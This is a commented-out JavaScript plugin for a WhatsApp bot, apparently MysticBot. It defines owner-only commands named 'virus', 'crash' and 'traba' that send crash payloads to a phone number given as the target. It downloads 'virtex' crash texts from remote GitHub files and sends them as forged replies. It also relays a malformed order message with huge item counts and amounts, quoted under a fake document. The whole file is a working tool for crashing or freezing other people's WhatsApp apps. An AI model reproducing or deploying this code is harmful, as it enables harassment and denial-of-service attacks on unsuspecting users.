/*
import fs from 'fs'
import fetch from 'node-fetch'
const { prepareWAMessageMedia, proto, generateWAMessageFromContent } = (await import('@adiwajshing/baileys')).default

let handler  = async (m, { conn, args, text, command, usedPrefix, participants }) => {
let from = ${text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' || m.chat}
const doc = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {})}, "message": { "documentMessage": { "url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc", "mimetype": "application/octet-stream", "fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=", "fileLength": "64455", "pageCount": 1, "mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=", "fileName": `simple•MD`, "fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="}}}
    
let virtex1 = await fetch('https://raw.githubusercontent.com/Caliph91/txt/main/pirtex/1.txt').then(v => v.text());
let virtex2 = await fetch('https://raw.githubusercontent.com/Caliph91/txt/main/pirtex/2.txt').then(v => v.text());
let virtex3 = await fetch('https://raw.githubusercontent.com/Caliph91/txt/main/pirtex/3.txt').then(v => v.text());
let virtex4 = await fetch('https://raw.githubusercontent.com/Caliph91/txt/main/pirtex/4.txt').then(v => v.text());
let virtex5 = await fetch('https://raw.githubusercontent.com/BrunoSobrino/ShadowBotV3-OBSOLETO/master/lib/Binario.txt').then(v => v.text());    
    
switch (command) {
    
case 'virus1': case 'c1': case 'binario1': case 'traba1': case 'crash1': {
conn.fakeReply(from, virtex1, '0@s.whatsapp.net', '🔥 *By MysticBot* 🔥', 'status@broadcast')
conn.fakeReply(from, virtex2, '0@s.whatsapp.net', '🔥 *By MysticBot* 🔥', 'status@broadcast')
conn.fakeReply(from, virtex3, '0@s.whatsapp.net', '🔥 *By MysticBot* 🔥', 'status@broadcast')
conn.fakeReply(from, virtex4, '0@s.whatsapp.net', '🔥 *By MysticBot* 🔥', 'status@broadcast')
conn.fakeReply(from, virtex5, '0@s.whatsapp.net', '🔥 *By MysticBot* 🔥', 'status@broadcast')} 
break
case 'virus2': case 'c2': case 'binario2': case 'traba2': case 'crash2': {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./Menu2.jpg') }, { upload: conn.waUploadToServer })
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "449756950375071",
"orderImage": messa.imageMessage,
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `© ...`,
"jpegThumbnail": imagen4,
"orderTitle": `© 😋`,
"sellerJid": "593991398786@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR",
}}), { userJid: from, quoted: doc })
conn.relayMessage(from, order.message, { messageId: order.key.id })} 
break        
    

    

}
if (from == m.chat) from = 'este chat'    
m.reply(`*[❗𝐈𝐍𝐅𝐎❗] 𝚂𝙴 𝙴𝙽𝚅𝙸𝙾 𝙲𝙾𝙽 𝙴𝚇𝙸𝚃𝙾 ${command} 𝙰 ${from}*`)
}
handler.command = /^(virus1|c1|binario1|traba1|crash1|virus2|c2|binario2|traba2|crash2)$/i
handler.rowner = true
export default handler
*/
